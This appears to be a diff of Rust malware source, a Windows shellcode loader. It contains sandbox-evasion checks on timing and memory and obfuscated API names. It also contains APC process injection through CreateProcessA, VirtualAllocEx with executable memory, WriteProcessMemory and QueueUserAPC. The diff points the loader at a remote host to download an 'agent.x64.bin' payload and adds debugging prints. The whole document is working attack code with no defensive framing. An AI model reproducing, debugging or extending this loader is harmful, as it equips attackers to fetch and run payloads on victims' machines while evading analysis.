@@ -114,6 +114,7 @@ fn evade() {
     let elapsed = start.elapsed();
 
     if elapsed.as_secs_f64() < 1.5 {
+        println!("exit for time");
         exit(1);
     }
 
@@ -128,15 +129,17 @@ fn evade() {
         GlobalMemoryStatusEx(&mut statex);
     }
 
-    let total_memory_in_gb = statex.ullTotalPhys / (1024 * 1024 * 1024);
-    if total_memory_in_gb <= 1 {
-        exit(1);
-    }
+    // let total_memory_in_gb = statex.ullTotalPhys / (1024 * 1024 * 1024);
+    // if total_memory_in_gb <= 1 {
+    //     println!("exit for memory");
+    //     exit(1);
+    // }
 }
 
 fn main() {
+    println!("Before Evade");
     evade();
-
+    println!("After Evade");
     let create_process_a: [char; 14] = [
         'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A',
     ];
@@ -164,7 +167,7 @@ fn main() {
     let pw_queue_user_apc: QueueUserAPCFunc =
         unsafe { std::mem::transmute(load_function("kernel32.dll", &queue_user_apc_str)) };
 
-    let url = "tcp://192.168.15.104:81";
+    let url = "http://10.200.47.86:8443/agent.x64.bin";
     let payload = match get_payload_from_url(url) {
         Ok(data) => data,
         Err(_e) => {
@@ -194,6 +197,7 @@ fn main() {
         );
 
         if success == 0 {
+            println!("Error pw_create_process");
             exit(1);
         }
 
@@ -206,6 +210,7 @@ fn main() {
             PAGE_EXECUTE_READWRITE,
         );
         if shell_address.is_null() {
+            println!("Error pw_virtual_alloc_ex");
             exit(1);
         }
 
@@ -218,12 +223,14 @@ fn main() {
             &mut bytes_written,
         );
         if write_result == 0 {
+            println!("Error pw_procmem");
             exit(1);
         }
 
         let apc_routine = std::mem::transmute(shell_address);
         let apc_result = pw_queue_user_apc(apc_routine, pi.hThread, 0);
         if apc_result == 0 {
+            println!("Error pw_queue_user_apc");
             exit(1);
         }
 
